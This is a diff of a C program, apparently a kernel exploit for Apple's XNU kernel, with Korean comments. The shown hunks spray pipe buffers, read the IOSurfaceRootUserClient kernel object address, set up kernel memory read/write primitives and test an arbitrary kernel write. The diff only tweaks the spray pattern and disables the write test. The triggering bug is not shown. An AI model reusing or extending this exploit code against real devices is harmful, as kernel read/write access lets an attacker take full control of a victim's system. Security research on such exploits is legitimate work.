@@ -79,7 +79,7 @@ int main(int argc, char *argv[], char *envp[]) {
 	pipefds = create_pipes();
 	pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
 	//memset_pattern4 = 메모리 설정 함수로, 4바이트 패턴을 사용하여 특정 메모리 영역을 채울 때 사용, 따라서 pipe 4글자로 채워짐
-	memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);	//<- work even if disable this code.
+	memset_pattern4(pipe_buffer, "ABCD", pipe_buffer_size);	//<- work even if disable this code.
 	pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size);
 	// read - bsd/kern/sys_generic.c:201
 	// fo_read - bsd/kern/kern_descrip.c:5572
@@ -91,7 +91,10 @@ int main(int argc, char *argv[], char *envp[]) {
 	IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
 	build_stable_kmem_api();
 
+	// printf("Going to call kpri_read32, set breakpoint first and press any key.\n"); char ch; ch = getchar();
+
 	printf("kpri_read32(kbase) = 0x%x\n", kpri_read32(kbase));
+#if 0 
 	pipe_info_t *fakePipeAlloc = kalloc_via_pipe(0x4000);
 	uint64_t kptr = fakePipeAlloc->kern_buffer;
 	printf("kptr = 0x%llx\n", kptr);
@@ -99,6 +102,7 @@ int main(int argc, char *argv[], char *envp[]) {
 	kpri_write64(kptr, 0x41424344CAFEBABE);
 	printf("[after] kpri_read32(kptr) = 0x%x, kpri_read32(kptr+4) = 0x%x\n", kpri_read32(kptr), kpri_read32(kptr+4));
 	kfree_via_pipe(fakePipeAlloc);
+#endif
 	
 	//clean
 	clean_stable_kmem_api();
